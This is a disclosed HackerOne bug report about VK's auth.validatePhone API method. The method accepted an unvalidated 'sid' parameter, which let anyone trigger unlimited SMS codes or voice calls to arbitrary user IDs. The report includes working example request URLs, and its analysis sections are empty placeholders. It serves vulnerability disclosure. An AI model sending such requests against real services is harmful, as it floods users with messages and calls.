---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '64963'
original_report_id: '64963'
title: 'API: Bug in method auth.validatePhone'
team_handle: vkcom
created_at: '2015-05-30T20:47:56.380Z'
disclosed_at: '2015-07-17T22:20:17.497Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 2
tags:
- hackerone
---

# API: Bug in method auth.validatePhone

## Metadata

- HackerOne Report ID: 64963
- Weakness: 
- Program: vkcom
- Disclosed At: 2015-07-17T22:20:17.497Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

The bug is that auth.validatePhone does not validate the parameter "sid". In theory he should be in the format "2fa_$userId_$appId_$hash", but to get the correct result (send SMS/make call) enough only "2fa_$userId_$anyText".

For example, these requests will send a SMS:
https://api.vk.com/method/auth.validatePhone?sid=2fa_23048942_lolka
https://api.vk.com/method/auth.validatePhone?sid=2fa_66748_блаблабла

It turns out that with this endlessly send SMS with the activation code, and to call if the request to add voice=1:
https://api.vk.com/method/auth.validatePhone?sid=2fa_66748_блаблабла&voice=1

There is also another bug. SMS and calls will be carried out in any case, even if the user has disabled two-factor authentication.
// I don't know, are you interested. But there is a bug - I reported.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
